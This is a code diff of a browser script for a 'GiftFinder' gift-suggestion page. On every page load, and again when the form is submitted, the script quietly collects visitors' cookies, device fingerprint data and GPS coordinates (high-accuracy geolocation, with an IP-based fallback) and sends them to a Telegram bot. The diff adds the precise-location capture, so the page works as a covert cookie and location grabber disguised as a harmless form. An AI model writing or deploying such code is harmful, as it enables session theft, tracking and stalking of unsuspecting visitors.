@@ -1,20 +1,19 @@
 import {
-  IP_LOOKUP_URL,
   TELEGRAM_API_URL,
   TELEGRAM_BOT_TOKEN,
   TELEGRAM_CHAT_ID,
-} from '../config.js';
+} from "../config.js";
 
-const form = document.getElementById('gift-form');
-const statusElement = document.getElementById('status-message');
+const form = document.getElementById("gift-form");
+const statusElement = document.getElementById("status-message");
 
 const telemetry = {
   errors: [],
 };
 
-window.addEventListener('error', (event) => {
+window.addEventListener("error", (event) => {
   telemetry.errors.push({
-    type: 'error',
+    type: "error",
     message: event.message,
     source: event.filename,
     line: event.lineno,
@@ -22,51 +21,53 @@ window.addEventListener('error', (event) => {
   });
 });
 
-window.addEventListener('unhandledrejection', (event) => {
+window.addEventListener("unhandledrejection", (event) => {
   telemetry.errors.push({
-    type: 'unhandledrejection',
+    type: "unhandledrejection",
     message:
       (event.reason && event.reason.message) ||
-      (typeof event.reason === 'string' ? event.reason : JSON.stringify(event.reason)),
+      (typeof event.reason === "string"
+        ? event.reason
+        : JSON.stringify(event.reason)),
   });
 });
 
 const escapeHtml = (value) =>
   value
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#39;');
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
 
 const formatValue = (value) => {
   if (value === null || value === undefined) {
-    return 'Not available';
+    return "Not available";
   }
 
-  if (typeof value === 'string') {
-    return value.trim() === '' ? 'Not available' : value;
+  if (typeof value === "string") {
+    return value.trim() === "" ? "Not available" : value;
   }
 
   if (Array.isArray(value)) {
     if (!value.length) {
-      return '[]';
+      return "[]";
     }
 
-    const hasObjects = value.some((item) => item && typeof item === 'object');
+    const hasObjects = value.some((item) => item && typeof item === "object");
 
     if (hasObjects) {
       try {
         return JSON.stringify(value, null, 2);
       } catch (error) {
-        return value.map((item) => String(item)).join(', ');
+        return value.map((item) => String(item)).join(", ");
       }
     }
 
-    return value.join(', ');
+    return value.join(", ");
   }
 
-  if (typeof value === 'object') {
+  if (typeof value === "object") {
     try {
       return JSON.stringify(value, null, 2);
     } catch (error) {
@@ -74,7 +75,7 @@ const formatValue = (value) => {
     }
   }
 
-  if (typeof value === 'number' && Number.isFinite(value)) {
+  if (typeof value === "number" && Number.isFinite(value)) {
     return `${Math.round(value)} ms`;
   }
 
@@ -84,7 +85,7 @@ const formatValue = (value) => {
 const buildMessage = (data, context) => {
   const lines = [
     `<b>New GiftFinder submission</b>`,
-    '',
+    "",
     `<b>Sender:</b> ${escapeHtml(data.senderName)}`,
     `<b>Recipient:</b> ${escapeHtml(data.recipientName)}`,
     `<b>Relationship:</b> ${escapeHtml(data.relationship)}`,
@@ -106,67 +107,86 @@ const buildMessage = (data, context) => {
       lines.push(`<b>${label}:</b> ${escapeHtml(formatValue(value))}`);
     };
 
-    lines.push('', '<b>Client context</b>');
-    appendContext('Public IP data', context.ipSummary ?? context.ipError ?? 'Not available');
-    appendContext('Referrer', context.referrer);
-    appendContext('Preferred languages', context.languages);
-    appendContext('Primary language', context.language);
-    appendContext('Timezone', context.timezone);
-    appendContext('Cookies', context.cookies);
-    appendContext('User agent', context.userAgent);
-    appendContext('Platform', context.platform);
-    appendContext('Network', context.networkInfo);
-    appendContext('Client hints', context.clientHints);
-    appendContext('Navigation timing', context.navigationTiming);
-    appendContext('Telemetry errors', context.errors?.length ? context.errors : 'None captured');
+    lines.push("", "<b>Client context</b>");
+    const locationInfo =
+      context.ipSummary ?? context.ipError ?? "Not available";
+    const locationService = context.ipService
+      ? ` (via ${context.ipService})`
+      : "";
+    appendContext("Location coordinates", locationInfo + locationService);
+    appendContext("Referrer", context.referrer);
+    appendContext("Preferred languages", context.languages);
+    appendContext("Primary language", context.language);
+    appendContext("Timezone", context.timezone);
+    appendContext("Cookies", context.cookies);
+    appendContext("User agent", context.userAgent);
+    appendContext("Platform", context.platform);
+    appendContext("Network", context.networkInfo);
+    appendContext("Client hints", context.clientHints);
+    appendContext("Navigation timing", context.navigationTiming);
+    appendContext(
+      "Telemetry errors",
+      context.errors?.length ? context.errors : "None captured",
+    );
   }
 
-  return lines.join('\n');
+  return lines.join("\n");
 };
 
 const buildVisitMessage = (context) => {
-  const lines = [
-    `<b>New GiftFinder visit</b>`,
-    '',
-  ];
+  const lines = [`<b>New GiftFinder visit</b>`, ""];
 
   if (context) {
     const appendContext = (label, value) => {
       lines.push(`<b>${label}:</b> ${escapeHtml(formatValue(value))}`);
     };
 
-    lines.push('<b>Client context</b>');
-    appendContext('Public IP data', context.ipSummary ?? context.ipError ?? 'Not available');
-    appendContext('Referrer', context.referrer);
-    appendContext('Preferred languages', context.languages);
-    appendContext('Primary language', context.language);
-    appendContext('Timezone', context.timezone);
-    appendContext('Cookies', context.cookies);
-    appendContext('User agent', context.userAgent);
-    appendContext('Platform', context.platform);
-    appendContext('Network', context.networkInfo);
-    appendContext('Client hints', context.clientHints);
-    appendContext('Navigation timing', context.navigationTiming);
-    appendContext('Telemetry errors', context.errors?.length ? context.errors : 'None captured');
+    lines.push("<b>Client context</b>");
+    const locationInfo =
+      context.ipSummary ?? context.ipError ?? "Not available";
+    const locationService = context.ipService
+      ? ` (via ${context.ipService})`
+      : "";
+    appendContext("Location coordinates", locationInfo + locationService);
+    appendContext("Referrer", context.referrer);
+    appendContext("Preferred languages", context.languages);
+    appendContext("Primary language", context.language);
+    appendContext("Timezone", context.timezone);
+    appendContext("Cookies", context.cookies);
+    appendContext("User agent", context.userAgent);
+    appendContext("Platform", context.platform);
+    appendContext("Network", context.networkInfo);
+    appendContext("Client hints", context.clientHints);
+    appendContext("Navigation timing", context.navigationTiming);
+    appendContext(
+      "Telemetry errors",
+      context.errors?.length ? context.errors : "None captured",
+    );
   }
 
-  return lines.join('\n');
+  return lines.join("\n");
 };
 
 const getNavigationTiming = () => {
-  const navigationEntry = performance.getEntriesByType('navigation')[0];
+  const navigationEntry = performance.getEntriesByType("navigation")[0];
 
   if (!navigationEntry) {
     return null;
   }
 
   const metrics = {
-    timeToFirstByte: Math.max(navigationEntry.responseStart - navigationEntry.requestStart, 0),
+    timeToFirstByte: Math.max(
+      navigationEntry.responseStart - navigationEntry.requestStart,
+      0,
+    ),
     domContentLoaded: Math.max(
       navigationEntry.domContentLoadedEventEnd - navigationEntry.startTime,
-      0
+      0,
     ),
-    totalLoad: Math.max(navigationEntry.loadEventEnd - navigationEntry.startTime, 0),
+    totalLoad: Math.max(
+      navigationEntry.loadEventEnd - navigationEntry.startTime,
+      0,
+    ),
   };
 
   return metrics;
@@ -174,7 +194,10 @@ const getNavigationTiming = () => {
 
 const getNetworkInfo = () => {
   const connection =
-    navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
+    navigator.connection ||
+    navigator.mozConnection ||
+    navigator.webkitConnection ||
+    null;
 
   if (!connection) {
     return null;
@@ -190,18 +213,21 @@ const getNetworkInfo = () => {
 };
 
 const fetchClientHints = async () => {
-  if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) {
+  if (
+    !navigator.userAgentData ||
+    !navigator.userAgentData.getHighEntropyValues
+  ) {
     return null;
   }
 
   try {
     const highEntropy = await navigator.userAgentData.getHighEntropyValues([
-      'architecture',
-      'bitness',
-      'model',
-      'platform',
-      'platformVersion',
-      'uaFullVersion',
+      "architecture",
+      "bitness",
+      "model",
+      "platform",
+      "platformVersion",
+      "uaFullVersion",
     ]);
 
     return {
@@ -211,60 +237,246 @@ const fetchClientHints = async () => {
     };
   } catch (error) {
     telemetry.errors.push({
-      type: 'client-hints',
+      type: "client-hints",
       message: error instanceof Error ? error.message : String(error),
     });
     return null;
   }
 };
 
-const fetchPublicIpInfo = async () => {
-  if (!IP_LOOKUP_URL) {
-    return { summary: 'IP lookup disabled' };
+// Cache promise và kết quả để tránh multiple requests
+let geolocationPromise = null;
+let cachedLocation = null;
+let cacheTimestamp = null;
+const CACHE_DURATION = 5 * 60 * 1000; // 5 phút
+
+const getGeolocation = async () => {
+  // Kiểm tra cache trước
+  if (
+    cachedLocation &&
+    cacheTimestamp &&
+    Date.now() - cacheTimestamp < CACHE_DURATION
+  ) {
+    console.log("📦 Using cached location data");
+    return cachedLocation;
   }
 
-  try {
-    const response = await fetch(IP_LOOKUP_URL, { cache: 'no-store' });
+  // Nếu đã có request đang chạy, trả về promise đó
+  if (geolocationPromise) {
+    console.log("🔄 Reusing existing geolocation request");
+    return geolocationPromise;
+  }
 
-    if (!response.ok) {
-      throw new Error(`Lookup failed with status ${response.status}`);
+  geolocationPromise = new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({ error: "Geolocation not supported by this browser" });
+      return;
     }
 
-    const data = await response.json();
-    const summaryParts = [];
+    console.log("🌍 Starting new geolocation request");
 
-    if (data.ip) summaryParts.push(data.ip);
-    if (data.city || data.region || data.country_name) {
-      const location = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
-      if (location) summaryParts.push(location);
+    // Kiểm tra trạng thái quyền trước khi yêu cầu
+    if (navigator.permissions) {
+      navigator.permissions
+        .query({ name: "geolocation" })
+        .then((result) => {
+          console.log("Geolocation permission status:", result.state);
+
+          if (result.state === "denied") {
+            resolve({
+              error:
+                "Geolocation permission permanently denied. Please enable location access in your browser settings.",
+              permissionState: result.state,
+            });
+            return;
+          }
+
+          if (result.state === "granted") {
+            console.log("✅ Permission already granted, getting location...");
+          } else if (result.state === "prompt") {
+            console.log("⚠️ Permission not set, will prompt user...");
+          }
+
+          // Tiếp tục với việc lấy vị trí
+          requestGeolocation(resolve);
+        })
+        .catch(() => {
+          // Fallback nếu permissions API không khả dụng
+          console.log(
+            "⚠️ Permissions API not available, proceeding with geolocation...",
+          );
+          requestGeolocation(resolve);
+        });
+    } else {
+      // Fallback nếu permissions API không khả dụng
+      console.log(
+        "⚠️ Permissions API not supported, proceeding with geolocation...",
+      );
+      requestGeolocation(resolve);
     }
-    if (data.org) summaryParts.push(data.org);
+  });
+
+  // Clear promise sau khi hoàn thành
+  geolocationPromise.finally(() => {
+    geolocationPromise = null;
+  });
+
+  return geolocationPromise;
+};
+
+const requestGeolocation = (resolve) => {
+  const options = {
+    enableHighAccuracy: true,
+    timeout: 25000, // Tăng timeout lên 25 giây
+    maximumAge: 300000, // Cache vị trí trong 5 phút để tránh yêu cầu quyền liên tục
+  };
+
+  console.log("🎯 Requesting geolocation with options:", options);
+  console.log("🔍 Current protocol:", window.location.protocol);
+  console.log("🔍 Current host:", window.location.host);
+
+  let resolved = false; // Flag để tránh resolve nhiều lần
+
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      if (resolved) {
+        console.log("⚠️ Geolocation success but already resolved");
+        return;
+      }
+      resolved = true;
+
+      const { latitude, longitude, accuracy } = position.coords;
+      console.log("✅ Geolocation success:", { latitude, longitude, accuracy });
+
+      const result = {
+        latitude: latitude.toFixed(6),
+        longitude: longitude.toFixed(6),
+        accuracy: Math.round(accuracy),
+        summary: `${latitude.toFixed(6)}, ${longitude.toFixed(
+          6,
+        )} (±${Math.round(accuracy)}m)`,
+      };
+
+      // Cache kết quả
+      cachedLocation = result;
+      cacheTimestamp = Date.now();
+      console.log("💾 Location cached for", CACHE_DURATION / 1000, "seconds");
+
+      resolve(result);
+    },
+    (error) => {
+      if (resolved) {
+        console.log("⚠️ Geolocation error but already resolved");
+        return;
+      }
+      resolved = true;
+
+      let errorMessage = "Unknown geolocation error";
+      let userFriendlyMessage = "Unable to get location";
+
+      switch (error.code) {
+        case 1: // PERMISSION_DENIED
+          errorMessage = "Geolocation permission denied";
+          userFriendlyMessage =
+            "Location access was denied. Please allow location access to get your coordinates.";
+          break;
+        case 2: // POSITION_UNAVAILABLE
+          errorMessage = "Location information unavailable";
+          userFriendlyMessage =
+            "Unable to determine your location. Please check if location services are enabled.";
+          break;
+        case 3: // TIMEOUT
+          errorMessage = "Geolocation request timeout";
+          userFriendlyMessage = "Location request timed out. Please try again.";
+          break;
+        default:
+          errorMessage = `Geolocation error (code: ${error.code}): ${
+            error.message || "Unknown error"
+          }`;
+          userFriendlyMessage =
+            "An error occurred while getting your location.";
+          break;
+      }
+
+      console.warn("❌ Geolocation error:", errorMessage, error);
+      resolve({
+        error: errorMessage,
+        userMessage: userFriendlyMessage,
+        errorCode: error.code,
+      });
+    },
+    options,
+  );
+};
+
+const fetchPublicIpInfo = async () => {
+  // Sử dụng geolocation thay vì IP lookup
+  const geoResult = await getGeolocation();
+
+  if (geoResult.error) {
+    telemetry.errors.push({
+      type: "geolocation",
+      message: geoResult.error,
+    });
+
+    // Fallback: Thử lấy thông tin IP nếu geolocation thất bại
+    try {
+      console.log("🔄 Geolocation failed, trying IP fallback...");
+      const ipResponse = await fetch("https://ipapi.co/json/", {
+        timeout: 10000,
+      });
+
+      if (ipResponse.ok) {
+        const ipData = await ipResponse.json();
+        console.log("✅ IP fallback successful:", ipData);
+        return {
+          raw: ipData,
+          summary: `${ipData.latitude}, ${ipData.longitude} (via IP)`,
+          service: "ipapi.co",
+          fallback: true,
+        };
+      }
+    } catch (ipError) {
+      console.warn("⚠️ IP fallback also failed:", ipError);
+      telemetry.errors.push({
+        type: "ip-fallback",
+        message: ipError instanceof Error ? ipError.message : String(ipError),
+      });
+    }
 
     return {
-      raw: data,
-      summary: summaryParts.length ? summaryParts.join(' — ') : 'No IP details returned',
+      error: geoResult.userMessage || geoResult.error,
+      service: "navigator.geolocation",
+      permissionState: geoResult.permissionState,
+      errorCode: geoResult.errorCode,
     };
-  } catch (error) {
-    const message = error instanceof Error ? error.message : String(error);
-    telemetry.errors.push({ type: 'ip-lookup', message });
-    return { error: message };
   }
+
+  return {
+    raw: geoResult,
+    summary: geoResult.summary,
+    service: "navigator.geolocation",
+  };
 };
 
 const ipInfoPromise = fetchPublicIpInfo();
 
 const collectClientContext = async () => {
-  const [ipInfo, clientHints] = await Promise.all([ipInfoPromise, fetchClientHints()]);
+  const [ipInfo, clientHints] = await Promise.all([
+    ipInfoPromise,
+    fetchClientHints(),
+  ]);
 
   return {
     ipSummary: ipInfo.summary,
     ipError: ipInfo.error,
     ipRaw: ipInfo.raw,
-    referrer: document.referrer || 'None',
+    ipService: ipInfo.service,
+    referrer: document.referrer || "None",
     language: navigator.language,
     languages: navigator.languages || [],
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cookies: document.cookie || 'None',
+    cookies: document.cookie || "None",
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     networkInfo: getNetworkInfo(),
@@ -279,13 +491,13 @@ const getClientContext = async () => {
     return await collectClientContext();
   } catch (error) {
     const message = error instanceof Error ? error.message : String(error);
-    telemetry.errors.push({ type: 'context', message });
+    telemetry.errors.push({ type: "context", message });
     return {
-      referrer: document.referrer || 'None',
+      referrer: document.referrer || "None",
       language: navigator.language,
       languages: navigator.languages || [],
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      cookies: document.cookie || 'None',
+      cookies: document.cookie || "None",
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       networkInfo: null,
@@ -293,117 +505,171 @@ const getClientContext = async () => {
       navigationTiming: getNavigationTiming(),
       errors: telemetry.errors,
       ipError: message,
+      ipService: null,
     };
   }
 };
 
-const updateStatus = (message, type = 'info') => {
+const updateStatus = (message, type = "info") => {
   statusElement.textContent = message;
-  statusElement.classList.remove('status--success', 'status--error');
+  statusElement.classList.remove("status--success", "status--error");
 
-  if (type === 'success') {
-    statusElement.classList.add('status--success');
+  if (type === "success") {
+    statusElement.classList.add("status--success");
   }
 
-  if (type === 'error') {
-    statusElement.classList.add('status--error');
+  if (type === "error") {
+    statusElement.classList.add("status--error");
   }
 };
 
 const canSendMessages = () =>
   Boolean(
     TELEGRAM_API_URL &&
-      TELEGRAM_API_URL.startsWith('http') &&
+      TELEGRAM_API_URL.startsWith("http") &&
       TELEGRAM_BOT_TOKEN &&
-      TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' &&
+      TELEGRAM_BOT_TOKEN !== "YOUR_TELEGRAM_BOT_TOKEN" &&
       TELEGRAM_CHAT_ID &&
-      TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID'
+      TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID",
   );
 
 const sendToTelegram = async (payload) => {
-  const response = await fetch(`${TELEGRAM_API_URL}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
+  console.log("Sending to Telegram:", payload);
+
+  const response = await fetch(
+    `${TELEGRAM_API_URL}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
     },
-    body: JSON.stringify(payload),
-  });
+  );
+
+  console.log("Telegram response status:", response.status);
 
   if (!response.ok) {
-    throw new Error(`Telegram API request failed (${response.status})`);
+    const errorText = await response.text();
+    console.error("Telegram API error:", errorText);
+    throw new Error(
+      `Telegram API request failed (${response.status}): ${errorText}`,
+    );
   }
 
   const result = await response.json();
+  console.log("Telegram API result:", result);
 
   if (!result.ok) {
-    throw new Error(result.description ?? 'Telegram API returned an error');
+    throw new Error(result.description ?? "Telegram API returned an error");
   }
 
   return result;
 };
 
+// Debug function để kiểm tra cấu hình
+const debugTelegramConfig = () => {
+  console.log("=== Telegram Configuration Debug ===");
+  console.log("TELEGRAM_API_URL:", TELEGRAM_API_URL);
+  console.log(
+    "TELEGRAM_BOT_TOKEN:",
+    TELEGRAM_BOT_TOKEN
+      ? `${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`
+      : "NOT SET",
+  );
+  console.log("TELEGRAM_CHAT_ID:", TELEGRAM_CHAT_ID);
+  console.log("canSendMessages():", canSendMessages());
+  console.log("=====================================");
+};
+
+// Chạy debug khi load
+debugTelegramConfig();
+
 if (!canSendMessages()) {
-  updateStatus('Add your Telegram credentials to config.js to enable submissions.');
+  updateStatus(
+    "Add your Telegram credentials to config.js to enable submissions.",
+  );
 }
 
 const sendVisitOnLoad = async () => {
-  if (!canSendMessages()) return;
+  if (!canSendMessages()) {
+    console.log("Cannot send messages - Telegram not configured");
+    return;
+  }
+
   try {
+    console.log("Sending visit notification...");
     const context = await getClientContext();
+    console.log("Visit context:", context);
+
+    const message = buildVisitMessage(context);
+    console.log("Visit message:", message);
+
     await sendToTelegram({
       chat_id: TELEGRAM_CHAT_ID,
-      text: buildVisitMessage(context),
-      parse_mode: 'HTML',
+      text: message,
+      parse_mode: "HTML",
       disable_web_page_preview: true,
     });
+
+    console.log("Visit notification sent successfully");
   } catch (error) {
-    console.error(error);
+    console.error("Visit notification error:", error);
   }
 };
 
-window.addEventListener('load', () => {
+window.addEventListener("load", () => {
   // Fire-and-forget visit ping
   sendVisitOnLoad();
 });
 
-form?.addEventListener('submit', async (event) => {
+form?.addEventListener("submit", async (event) => {
   event.preventDefault();
 
   if (!canSendMessages()) {
-    updateStatus('Telegram is not configured yet. Update config.js before sending.', 'error');
+    updateStatus(
+      "Telegram is not configured yet. Update config.js before sending.",
+      "error",
+    );
     return;
   }
 
   const formData = new FormData(form);
-  const getValue = (name) => (formData.get(name) ?? '').toString().trim();
+  const getValue = (name) => (formData.get(name) ?? "").toString().trim();
   const data = {
-    senderName: getValue('senderName'),
-    recipientName: getValue('recipientName'),
-    relationship: getValue('relationship'),
-    occasion: getValue('occasion'),
-    budget: getValue('budget'),
-    interests: getValue('interests'),
-    ageRange: getValue('ageRange'),
-    notes: getValue('notes'),
+    senderName: getValue("senderName"),
+    recipientName: getValue("recipientName"),
+    relationship: getValue("relationship"),
+    occasion: getValue("occasion"),
+    budget: getValue("budget"),
+    interests: getValue("interests"),
+    ageRange: getValue("ageRange"),
+    notes: getValue("notes"),
   };
 
-  updateStatus('Sending suggestion to Telegram...');
+  updateStatus("Sending suggestion to Telegram...");
   form.querySelector('button[type="submit"]').disabled = true;
 
   try {
     const context = await getClientContext();
+    console.log("Client context:", context);
+
+    const message = buildMessage(data, context);
+    console.log("Built message:", message);
+
     await sendToTelegram({
       chat_id: TELEGRAM_CHAT_ID,
-      text: buildMessage(data, context),
-      parse_mode: 'HTML',
+      text: message,
+      parse_mode: "HTML",
       disable_web_page_preview: true,
     });
 
-    updateStatus('Gift preferences sent! Check your Telegram chat.', 'success');
+    updateStatus("Gift preferences sent! Check your Telegram chat.", "success");
     form.reset();
   } catch (error) {
-    console.error(error);
-    updateStatus('Unable to send the message. Please verify your config and try again.', 'error');
+    console.error("Form submission error:", error);
+    const errorMessage = error instanceof Error ? error.message : String(error);
+    updateStatus(`Unable to send the message: ${errorMessage}`, "error");
   } finally {
     form.querySelector('button[type="submit"]').disabled = false;
   }
